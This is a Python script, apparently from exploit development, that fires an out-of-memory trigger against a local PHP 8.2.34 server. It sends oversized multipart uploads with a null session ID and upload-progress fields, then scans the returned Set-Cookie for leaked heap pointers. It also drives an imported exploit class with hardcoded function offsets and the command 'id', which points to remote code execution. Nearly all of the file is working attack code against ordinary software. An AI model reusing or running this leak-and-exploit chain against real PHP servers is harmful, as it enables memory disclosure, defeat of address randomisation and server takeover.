"""Debug 8.2.34 stage-1: fire the OOM trigger, capture the Set-Cookie, analyze the leak."""
import sys, os, re, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18111/"
t = E.Target(URL, timeout=90.0, verbose=True)

def fire_oom(field_count=1001, field_size=1, big_mb=12):
    """Fire the stage-1 OOM trigger, return the raw Set-Cookie value."""
    parts = [{"name": f"p{i:04d}", "data": b"x" * field_size} for i in range(field_count)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)},
    ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception as e:
        print(f"  [err] {e}", flush=True)
        return b"", None
    raw = E.parse_cookie(resp)
    return raw, resp

def analyze(raw, label):
    print(f"\n=== {label}: cookie len={len(raw)} ===", flush=True)
    if len(raw) < 16:
        print("  [no leak — too short]", flush=True)
        return
    # Count 2MB-aligned and 4KB-aligned heap pointers
    c2m = Counter()
    c4k = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c2m[v & ~0x1FFFFF] += 1
            c4k[v & ~0xFFF] += 1
    if c2m:
        top = c2m.most_common(3)
        print(f"  2MB-aligned top: {[(hex(k), v) for k, v in top]}", flush=True)
    if c4k:
        top = c4k.most_common(3)
        print(f"  4KB-aligned top: {[(hex(k), v) for k, v in top]}", flush=True)
    # Print first 128 bytes hex
    print(f"  first 128B: {raw[:128].hex()}", flush=True)

# Try different OOM shapes
shapes = [
    (1001, 1, 12, "1001x1B + 12MB (current)"),
    (1001, 39, 12, "1001x39B + 12MB"),
    (1001, 1, 8, "1001x1B + 8MB"),
    (500, 1, 12, "500x1B + 12MB"),
    (2000, 1, 12, "2000x1B + 12MB"),
    (1001, 48, 12, "1001x48B + 12MB"),
]

for fc, fs, mb, label in shapes:
    print(f"\n### Shape: {label}", flush=True)
    t2 = E.Target(URL, timeout=90.0, verbose=False)
    ex = E.Exploit(t2, "id", zif_offset=0x39b8a0, dtor_offset=0x487650,
                   htdata_offset=0x690d8, huge_mb=mb, verbose=False, profile="bookworm")
    ex.rotate()
    time.sleep(0.5)
    raw, resp = fire_oom(fc, fs, mb)
    analyze(raw, label)
    time.sleep(1)
